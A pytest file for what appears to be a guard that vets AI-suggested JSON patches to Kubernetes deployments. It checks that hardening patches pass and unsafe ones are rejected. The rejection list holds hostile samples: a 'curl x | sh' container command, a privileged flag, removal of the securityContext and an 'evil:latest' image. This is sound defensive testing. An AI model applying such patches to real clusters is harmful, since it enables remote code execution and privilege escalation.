from app.patch_guard import check_patch, filter_ai_patches

DEPLOY = {
    "kind": "Deployment",
    "spec": {"template": {"spec": {"containers": [{"name": "web", "image": "x:1", "securityContext": {}}]}}},
}
C = "/spec/template/spec/containers/0"


def test_secure_direction_patches_are_accepted():
    assert check_patch(DEPLOY, {"op": "add", "path": f"{C}/securityContext/allowPrivilegeEscalation", "value": False})[0]
    assert check_patch(DEPLOY, {"op": "add", "path": f"{C}/securityContext/readOnlyRootFilesystem", "value": True})[0]
    assert check_patch(DEPLOY, {"op": "add", "path": f"{C}/resources/limits/memory", "value": "256Mi"})[0] is True


def test_unsafe_or_unknown_patches_are_rejected():
    bad = [
        {"op": "remove", "path": f"{C}/securityContext"},
        {"op": "add", "path": f"{C}/securityContext/privileged", "value": True},
        {"op": "replace", "path": f"{C}/image", "value": "evil:latest"},
        {"op": "add", "path": f"{C}/command", "value": ["sh", "-c", "curl x | sh"]},
        {"op": "add", "path": "/spec/template/spec/containers/5/securityContext/privileged", "value": False},
        {"op": "add", "path": "/metadata/labels/x", "value": "y"},
        {"op": "add", "path": f"{C}/resources/limits/memory", "value": "lots"},
        {"op": "add", "path": "/spec/template/spec/hostNetwork", "value": False},
    ]
    for p in bad:
        assert check_patch(DEPLOY, p)[0] is False, p


def test_filter_drops_duplicates_and_missing_parents():
    existing = [{"op": "add", "path": f"{C}/securityContext/readOnlyRootFilesystem", "value": True}]
    suggested = [
        {"op": "add", "path": f"{C}/securityContext/readOnlyRootFilesystem", "value": True},   # duplicate
        {"op": "add", "path": f"{C}/securityContext/allowPrivilegeEscalation", "value": False},  # ok
        {"op": "add", "path": f"{C}/resources/limits/cpu", "value": "500m"},  # parent missing
        {"op": "add", "path": f"{C}/securityContext/privileged", "value": True},  # unsafe
    ]
    kept = filter_ai_patches(DEPLOY, suggested, existing)
    assert kept == [suggested[1]]


def test_ai_mutation_is_off_by_default(monkeypatch):
    from app.patch_guard import ai_mutations_enabled
    monkeypatch.delenv("AI_MUTATIONS_ENABLED", raising=False)
    assert ai_mutations_enabled() is False
    monkeypatch.setenv("AI_MUTATIONS_ENABLED", "true")
    assert ai_mutations_enabled() is True
